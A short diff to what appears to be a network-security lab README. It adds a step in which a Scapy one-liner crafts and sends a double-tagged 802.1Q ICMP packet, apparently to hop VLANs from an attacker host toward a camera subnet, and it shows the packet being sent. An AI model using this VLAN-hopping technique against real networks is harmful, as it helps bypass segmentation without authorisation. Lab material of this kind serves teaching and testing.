@@ -98,3 +98,12 @@ R-Click -> Edit config
 ATTACKER should be able to ping CAMERA_01 or CENTRAL_SERVER due to network segmentation
 
 ![](assets/attacker-ping.gif)
+
+Craft a double-tagged ICMP packet with Scapy
+
+<pre>
+  >>> packet = Ether(dst='ff:ff:ff:ff:ff:ff')/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.0.250')/ICMP()
+  >>> sendp(packet, iface="eth0")
+  .
+  Sent 1 packets.
+</pre>
